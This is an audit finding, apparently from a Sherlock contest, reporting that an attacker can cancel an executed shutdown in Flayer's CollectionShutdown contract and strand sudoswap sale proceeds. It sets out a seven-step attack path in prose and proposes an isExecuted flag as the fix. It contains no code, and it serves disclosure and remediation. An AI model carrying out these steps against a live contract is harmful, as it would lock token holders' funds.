# Attacker can cancel an executed shutdown

### Summary

An attacker can cancel an executed shutdown causing proceeds from the sudoswap sales to be stuck in the CollectionShutdown contract.

### Root Cause

In [CollectionShutdown.sol:209](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L209) `canExecute` can be set to true even after the shutdown has been executed by anybody who hasn't voted previously. 

With `canExecute` set to `true` you can execute [cancel()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L403) to delete the `collectionParams`. With that struct deleted, [claim()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L292) will revert because `sweeperPool == address(0)`.

### Internal pre-conditions

none

### External pre-conditions

none

### Attack Path

1. After a shutdown has started, the attacker mints collection tokens such that `totalSupply > 4e18 * 10 ** denomination`
2. Attacker votes for the shutdown to reach quorum
3. Attacker executes the shutdown
4. Attacker reclaims their votes (allowing them to vote again)
5. Attacker votes again (sets `canExecute = true`)
6. Attacker creates a new collection token for the collection
7. Attacker calls `cancel()` causing `collectionParams` to be deleted for the collection which resets everything.


### Impact

All the profit from the sale of the locked NFTs through the sudoswap pool will be stuck in the CollectionShutdown contract. Holders of the collection token won't be able to claim the proceeds.

### Mitigation

Use new variable `isExecuted` to keep track whether a shutdown has been executed or not.
